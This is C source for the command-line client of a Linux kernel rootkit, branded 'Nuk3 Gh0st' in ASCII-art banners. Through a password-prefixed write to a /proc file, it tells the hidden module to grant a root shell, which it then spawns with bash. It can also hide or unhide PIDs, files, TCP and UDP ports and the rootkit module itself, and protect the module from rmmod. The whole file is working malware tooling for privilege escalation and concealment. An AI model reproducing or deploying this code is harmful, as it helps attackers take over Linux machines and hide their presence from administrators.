/*
 * Copyright (C) 2016-2017 Maxim Biro <nurupo.contributions@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <getopt.h>
#include <unistd.h>

#include "config.h"

void print_help(char **argv)
{
    printf(
      /*"  ╔╗╔┬ ┬┌─┐┬  ┌─┐┌─┐┬─┐   \n" 
        "  ║║║│ ││  │  ├┤ ├─┤├┬┘   \n" 
        "  ╝╚╝└─┘└─┘┴─┘└─┘┴ ┴┴└─   \n"
        "   ╔═╗┬ ┬┌─┐┌─┐┌┬┐        \n"
        "   ║ ╦├─┤│ │└─┐ │         \n"
        "   ╚═╝┴ ┴└─┘└─┘ ┴         \n"
        "     By Juan Schällibaum  \n"
        "                          \n"
        "                                                                    \n"
        "   888b      88               88         ad888888b,                 \n"
        "   8888b     88               88        d8#     #88                 \n"
        "   88 `8b    88               88                a8P                 \n"
        "   88  `8b   88  88       88  88   ,d8       aad8#                  \n"
        "   88   `8b  88  88       88  88 ,a8#        ##Y8,                  \n"
        "   88    `8b 88  88       88  8888[             #8b                 \n"
        "   88     `8888  #8a,   ,a88  88`#Yba,  Y8,     a88                 \n"
        "   88      `888   ##YbbdP'Y8  88   `Y8a  #Y888888P'                 \n"
        "                                                                    \n"
        "     ,ad8888ba,   88              ,a8888a,                          \n"
        "    d8#'    `#8b  88            ,8P#'  `#Y8,                ,d      \n"
        "   d8'            88           ,8P        Y8,               88      \n"
        "   88             88,dPPYba,   88          88  ,adPPYba,  MM88MMM   \n"
        "   88      88888  88P'    #8a  88          88  I8[    ##    88      \n"
        "   Y8,        88  88       88  `8b        d8'   `#Y8ba,     88      \n"
        "    Y8a.    .a88  88       88   `8ba,  ,ad8'   aa    ]8I    88,     \n"
        "     `#Y88888P#   88       88      Y8888P      `#YbbdP#'    #Y888   \n"
        "                                                                    \n"
        "                                                                    \n"
        "                                By Juan Schällibaum                 \n"
        "                                                                    \n"*/
        "                                             \n"
        "$$    $$            $$         $$$$$$        \n" 
        "$$$   $$            $$     $$ $$    $$       \n" 
        "$$$$  $$  $$    $$  $$    $$        $$       \n" 
        "$$ $$ $$  $$    $$  $$   $$     $$$$$        \n" 
        "$$  $$$$  $$    $$  $$$$$$         $$        \n"
        "$$   $$$  $$    $$  $$   $$   $$    $$       \n" 
        "$$    $$   $$$$$$   $$    $$   $$$$$$        \n" 
        "                                             \n"
        " $$$$$$  $$        $$$$$$             $$     \n"
        "$$    $$ $$       $$$   $$            $$     \n"
        "$$       $$$$$$$  $$$$  $$  $$$$$$$ $$$$$$   \n"
        "$$  $$$$ $$    $$ $$ $$ $$ $$         $$     \n"
        "$$    $$ $$    $$ $$  $$$$  $$$$$$    $$     \n"
        "$$    $$ $$    $$ $$   $$$       $$   $$ $$  \n"
        " $$$$$$  $$    $$  $$$$$$  $$$$$$$    $$$$   \n"
        "                                             \n"
        "                By Juan Schällibaum          \n"
        "                                             \n"
                            
        
        "Usage: %s [OPTION]...\n"
        "\n"
        "Options:\n"
        "  --root-shell                 Grants you root shell access.\n"
        "  --hide-pid=PID               Hides the specified PID.\n"
        "  --unhide-pid=PID             Unhides the specified PID.\n"
        "  --hide-file=FILENAME         Hides the specified FILENAME globally.\n"
        "                               Must be a filename without any path.\n"
        "  --unhide-file=FILENAME       Unhides the specified FILENAME.\n"
        "  --hide-tcp-port=PORT         Hides the specified tcp PORT.\n"
        "  --unhide-tcp-port=PORT       Unhides the specified tcp PORT.\n"
        "  --hide-tcp6-port=PORT        Hides the specified tcp6 PORT.\n"
        "  --unhide-tcp6-port=PORT      Unhides the specified tcp6 PORT.\n"
        "  --hide-udp-port=PORT         Hides the specified udp PORT.\n"
        "  --unhide-udp-port=PORT       Unhides the specified udp PORT.\n"
        "  --hide-udp6-port=PORT        Hides the specified udp6 PORT.\n"
        "  --unhide-udp6-port=PORT      Unhides the specified udp6 PORT.\n"
        "  --hide                       Hides the rootkit LKM.\n"
        "  --unhide                     Unhides the rootkit LKM.\n"
        "  --help                       Print this help message.\n"
        "  --protect                    Protects the rootkit from rmmod.\n"
        "  --unprotect                  Disables the rmmod protection.\n\n", argv[0]);
}

void handle_command_line_arguments(int argc, char **argv, int *root, 
                                   int *hide_pid, int *unhide_pid, char **pid, int *hide_file, int *unhide_file, char **file, 
                                   int *hide_tcp_port, int *unhide_tcp_port, int *hide_tcp6_port, int *unhide_tcp6_port,
                                   int *hide_udp_port, int *unhide_udp_port, int *hide_udp6_port, int *unhide_udp6_port, 
                                   char **port, int *hide, int *unhide, int *protect, int *unprotect)
{
    if (argc < 2) {
        fprintf(stderr, "Error: No arguments provided.\n\n");
        print_help(argv);
        exit(1);
    }

    opterr = 0;

    static struct option long_options[] = {
        {"root-shell",       no_argument,       0, 'a'},
        {"hide-pid",         required_argument, 0, 'b'},
        {"unhide-pid",       required_argument, 0, 'c'},
        {"hide-file",        required_argument, 0, 'd'},
        {"unhide-file",      required_argument, 0, 'e'},
        {"hide-tcp-port",    required_argument, 0, 'f'},
        {"unhide-tcp-port",  required_argument, 0, 'g'},
        {"hide-tcp6-port",   required_argument, 0, 'h'},
        {"unhide-tcp6-port", required_argument, 0, 'i'},
        {"hide-udp-port",    required_argument, 0, 'j'},
        {"unhide-udp-port",  required_argument, 0, 'k'},
        {"hide-udp6-port",   required_argument, 0, 'l'},
        {"unhide-udp6-port", required_argument, 0, 'm'},
        {"hide",             no_argument,       0, 'n'},
        {"unhide",           no_argument,       0, 'o'},
        {"help",             no_argument,       0, 'p'},
        {"protect",          no_argument,       0, 'q'},
        {"unprotect",        no_argument,       0, 'r'},
        {0,                  0,                 0,  0 }
    };

    *root = 0;
    *hide_pid = 0;
    *unhide_pid = 0;
    *pid = NULL;
    *hide_file = 0;
    *unhide_file = 0;
    *file = NULL;
    *hide_tcp_port = 0;
    *unhide_tcp_port = 0;
    *hide_tcp6_port = 0;
    *unhide_tcp6_port = 0;
    *hide_udp_port = 0;
    *unhide_udp_port = 0;
    *hide_udp6_port = 0;
    *unhide_udp6_port = 0;
    *port = NULL;
    *hide = 0;
    *unhide = 0;
    *protect = 0;
    *unprotect = 0;

    int opt;

    while ((opt = getopt_long(argc, argv, ":", long_options, NULL)) != -1) {

        switch (opt) {

            case 'a':
                *root = 1;
                break;

            case 'b':
                *hide_pid = 1;
                *pid = optarg;
                break;

            case 'c':
                *unhide_pid = 1;
                *pid = optarg;
                break;

            case 'd':
                *hide_file = 1;
                *file = optarg;
                break;

            case 'e':
                *unhide_file = 1;
                *file = optarg;
                break;
                
            case 'f':
                *hide_tcp_port = 1;
                *port = optarg;
                break;
                
            case 'g':
                *unhide_tcp_port = 1;
                *port = optarg;
                break;
               
            case 'h':
                *hide_tcp6_port = 1;
                *port = optarg;
                break;
              
            case 'i':
                *unhide_tcp6_port = 1;
                *port = optarg;
                break;
            
            case 'j':
                *hide_udp_port = 1;
                *port = optarg;
                break;
                
            case 'k':
                *unhide_udp_port = 1;
                *port = optarg;
                break;
                
            case 'l':
                *hide_udp6_port = 1;
                *port = optarg;
                break;
                
            case 'm':
                *unhide_udp6_port = 1;
                *port = optarg;
                break;                 

            case 'n':
                *hide = 1;
                break;

            case 'o':
                *unhide = 1;
                break;

            case 'p':
                print_help(argv);
                exit(0);

            case 'q':
                *protect = 1;
                break;

            case 'r':
                *unprotect = 1;
                break;
                      
                

            case '?':
                fprintf(stderr, "Error: Unrecognized option %s\n\n", argv[optind - 1]);
                print_help(argv);
                exit(1);

            case ':':
                fprintf(stderr, "Error: No argument provided for option %s\n\n", argv[optind - 1]);
                print_help(argv);
                exit(1);
        }
    }

    if ((*root + *hide_pid + *unhide_pid + *hide_file + *unhide_file + 
         *hide_tcp_port + *unhide_tcp_port + *hide_tcp6_port + *unhide_tcp6_port + 
         *hide_udp_port + *unhide_udp_port + *hide_udp6_port + *unhide_udp6_port +
         *hide + *unhide + *protect + *unprotect) != 1) {
        fprintf(stderr, "Error: Exactly one option should be specified\n\n");
        print_help(argv);
        exit(1);
    }
}

void write_buffer(char **dest_ptr, char *src, size_t size)
{
    memcpy(*dest_ptr, src, size);
    *dest_ptr += size;
}

int main(int argc, char **argv)
{
    int root;
    int hide_pid;
    int unhide_pid;
    char *pid;
    int hide_file;
    int unhide_file;
    char *file;
    int hide_tcp_port;
    int unhide_tcp_port;
    int hide_tcp6_port;
    int unhide_tcp6_port;
    int hide_udp_port;
    int unhide_udp_port;
    int hide_udp6_port;
    int unhide_udp6_port;
    char *port;
    int hide;
    int unhide;
    int protect;
    int unprotect;
    

    handle_command_line_arguments(argc, argv, &root, 
                                  &hide_pid, &unhide_pid, &pid, &hide_file, &unhide_file, &file,
                                  &hide_tcp_port, &unhide_tcp_port, &hide_tcp6_port, &unhide_tcp6_port,
                                  &hide_udp_port, &unhide_udp_port, &hide_udp6_port, &unhide_udp6_port, 
                                  &port, &hide, &unhide, &protect, &unprotect);

    size_t buf_size = 0;

    buf_size += sizeof(CFG_PASS);

    if (root) {
        buf_size += sizeof(CFG_ROOT);
    } else if (hide_pid) {
        buf_size += sizeof(CFG_HIDE_PID) + strlen(pid);
    } else if (unhide_pid) {
        buf_size += sizeof(CFG_UNHIDE_PID) + strlen(pid);   
    } else if (hide_file) {
        buf_size += sizeof(CFG_HIDE_FILE) + strlen(file);
    } else if (unhide_file) {
        buf_size += sizeof(CFG_UNHIDE_FILE) + strlen(file);
    } else if (hide_tcp_port) {
        buf_size += sizeof(CFG_HIDE_TCP_PORT) + strlen(port);
    } else if (unhide_tcp_port) {
        buf_size += sizeof(CFG_UNHIDE_TCP_PORT) + strlen(port);
    } else if (hide_tcp6_port) {
        buf_size += sizeof(CFG_HIDE_TCP6_PORT) + strlen(port);
    } else if (unhide_tcp6_port) {
        buf_size += sizeof(CFG_UNHIDE_TCP6_PORT) + strlen(port);
    } else if (hide_udp_port) {
        buf_size += sizeof(CFG_HIDE_UDP_PORT) + strlen(port);
    } else if (unhide_udp_port) {
        buf_size += sizeof(CFG_UNHIDE_UDP_PORT) + strlen(port);
    } else if (hide_udp6_port) {
        buf_size += sizeof(CFG_HIDE_UDP6_PORT) + strlen(port);
    } else if (unhide_udp6_port) {
        buf_size += sizeof(CFG_UNHIDE_UDP6_PORT) + strlen(port);
    } else if (hide) {
        buf_size += sizeof(CFG_HIDE);
    } else if (unhide) {
        buf_size += sizeof(CFG_UNHIDE);
    } else if (protect) {
        buf_size += sizeof(CFG_PROTECT);
    } else if (unprotect) {
        buf_size += sizeof(CFG_UNPROTECT);
    }

    buf_size += 1; // for null terminator

    char *buf = malloc(buf_size);
    buf[buf_size - 1] = 0;

    char *buf_ptr = buf;

    write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));

    if (root) {
        write_buffer(&buf_ptr, CFG_ROOT, sizeof(CFG_ROOT));
    } else if (hide_pid) {
        write_buffer(&buf_ptr, CFG_HIDE_PID, sizeof(CFG_HIDE_PID));
        write_buffer(&buf_ptr, pid, strlen(pid));
    } else if (unhide_pid) {
        write_buffer(&buf_ptr, CFG_UNHIDE_PID, sizeof(CFG_UNHIDE_PID));
        write_buffer(&buf_ptr, pid, strlen(pid));     
    } else if (hide_file) {
        write_buffer(&buf_ptr, CFG_HIDE_FILE, sizeof(CFG_HIDE_FILE));
        write_buffer(&buf_ptr, file, strlen(file));
    } else if (unhide_file) {
        write_buffer(&buf_ptr, CFG_UNHIDE_FILE, sizeof(CFG_UNHIDE_FILE));
        write_buffer(&buf_ptr, file, strlen(file));
    } else if (hide_tcp_port) {
        write_buffer(&buf_ptr, CFG_HIDE_TCP_PORT, sizeof(CFG_HIDE_TCP_PORT));
        write_buffer(&buf_ptr, port, strlen(port));
    } else if (unhide_tcp_port) {
        write_buffer(&buf_ptr, CFG_UNHIDE_TCP_PORT, sizeof(CFG_UNHIDE_TCP_PORT));
        write_buffer(&buf_ptr, port, strlen(port));
    } else if (hide_tcp6_port) {
        write_buffer(&buf_ptr, CFG_HIDE_TCP6_PORT, sizeof(CFG_HIDE_TCP6_PORT));
        write_buffer(&buf_ptr, port, strlen(port));
    } else if (unhide_tcp6_port) {
        write_buffer(&buf_ptr, CFG_UNHIDE_TCP6_PORT, sizeof(CFG_UNHIDE_TCP6_PORT));
        write_buffer(&buf_ptr, port, strlen(port));
    } else if (hide_udp_port) {
        write_buffer(&buf_ptr, CFG_HIDE_UDP_PORT, sizeof(CFG_HIDE_UDP_PORT));
        write_buffer(&buf_ptr, port, strlen(port));
    } else if (unhide_udp_port) {
        write_buffer(&buf_ptr, CFG_UNHIDE_UDP_PORT, sizeof(CFG_UNHIDE_UDP_PORT));
        write_buffer(&buf_ptr, port, strlen(port));
    } else if (hide_udp6_port) {
        write_buffer(&buf_ptr, CFG_HIDE_UDP6_PORT, sizeof(CFG_HIDE_UDP6_PORT));
        write_buffer(&buf_ptr, port, strlen(port));
    } else if (unhide_udp6_port) {
        write_buffer(&buf_ptr, CFG_UNHIDE_UDP6_PORT, sizeof(CFG_UNHIDE_UDP6_PORT));
        write_buffer(&buf_ptr, port, strlen(port));
    } else if (hide) {
        write_buffer(&buf_ptr, CFG_HIDE, sizeof(CFG_HIDE));
    } else if (unhide) {
        write_buffer(&buf_ptr, CFG_UNHIDE, sizeof(CFG_UNHIDE));
    } else if (protect) {
        write_buffer(&buf_ptr, CFG_PROTECT, sizeof(CFG_PROTECT));
    } else if (unprotect) {
        write_buffer(&buf_ptr, CFG_UNPROTECT, sizeof(CFG_UNPROTECT));
    }

    int fd = open("/proc/" CFG_PROC_FILE, O_RDONLY);

    if (fd < 1) {
        int fd = open("/proc/" CFG_PROC_FILE, O_WRONLY);

        if (fd < 1) {
            fprintf(stderr, "Error: Failed to open %s\n", "/proc/" CFG_PROC_FILE);
            return 1;
        }

        write(fd, buf, buf_size);
    } else {
        read(fd, buf, buf_size);
    }

    close(fd);
    free(buf);

    if (root) {
        execl("/bin/bash", "bash", NULL);
    }

    return 0;
}
